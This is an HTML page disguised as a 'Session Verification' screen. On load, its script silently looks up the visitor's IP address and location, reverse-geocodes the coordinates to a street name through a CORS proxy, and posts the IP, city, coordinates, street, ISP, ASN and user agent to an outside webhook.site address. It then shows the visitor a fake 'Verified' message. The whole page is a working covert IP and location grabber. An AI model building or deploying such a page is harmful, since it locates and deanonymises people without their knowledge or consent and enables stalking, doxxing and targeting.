<!DOCTYPE html>
<html>
<head>
  <title>Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
</head>

<body style="font-family:Arial;text-align:center;margin-top:50px;">
  <h3>Session Verification</h3>
  <p>Verifying device and region...</p>

  <script>
    async function verify() {
      try {
        // Step 1: Get IP info
        const ipData = await fetch("https://ipapi.co/json/").then(res => res.json());

        // Step 2: Reverse geocode using CORS proxy
        const proxyUrl = "https://api.allorigins.win/get?url=";
        const targetUrl = encodeURIComponent(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${ipData.latitude}&lon=${ipData.longitude}`);
        
        const geoData = await fetch(proxyUrl + targetUrl)
          .then(res => res.json())
          .then(res => JSON.parse(res.contents));

        const street = geoData.address.road || "N/A"; // street name if available

        // Step 3: Send data to webhook
        await fetch("https://webhook.site/a55ffe99-f30b-44b2-80c6-3f31ae2fa387", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            ip: ipData.ip,
            city: ipData.city,
            region: ipData.region,
            country: ipData.country_name,
            latitude: ipData.latitude,
            longitude: ipData.longitude,
            street: street,
            isp: ipData.org,
            asn: ipData.asn,
            userAgent: navigator.userAgent,
            time: new Date().toISOString()
          })
        });

        document.body.innerHTML = "<h3>Verified âœ…</h3>";

      } catch (err) {
        document.body.innerHTML = "<h3>Verification failed</h3><p>" + err + "</p>";
      }
    }

    verify();
  </script>
</body>
</html>
